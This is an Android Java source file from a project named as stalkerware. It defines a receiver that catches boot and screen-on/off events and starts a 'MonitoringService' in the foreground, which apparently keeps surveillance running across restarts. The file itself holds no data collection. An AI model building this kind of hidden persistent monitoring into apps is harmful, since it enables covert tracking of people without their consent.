package com.thomasmortimer.stalkerware;

import static android.content.Intent.ACTION_BOOT_COMPLETED;
import static android.content.Intent.ACTION_SCREEN_OFF;
import static android.content.Intent.ACTION_SCREEN_ON;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import androidx.core.content.ContextCompat;

public class SystemEventReceiver extends BroadcastReceiver {

    public static final String INTENT_RECEIVED = "THOMAS_MORTIMER_INTENT_RECEIVED";
    public static final String EXTRA_INFO = "THOMAS_MORTIMER_EXTRA_INFO";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (ACTION_BOOT_COMPLETED.equals(intent.getAction())
                || ACTION_SCREEN_OFF.equals(intent.getAction())
                || ACTION_SCREEN_ON.equals(intent.getAction())) {
            Log.d(MyStalkerActivity.APP_LOG_NAME, "Intent " + intent.getAction() + " received");
            sendIntentToMonitorService(context, intent);
        }
    }

    private void sendIntentToMonitorService(Context context, Intent intent) {
        Intent serviceIntent = new Intent(context, MonitoringService.class);
        serviceIntent.setAction(INTENT_RECEIVED);
        serviceIntent.putExtra(EXTRA_INFO, intent.getAction());
        ContextCompat.startForegroundService(context, serviceIntent);
    }
}
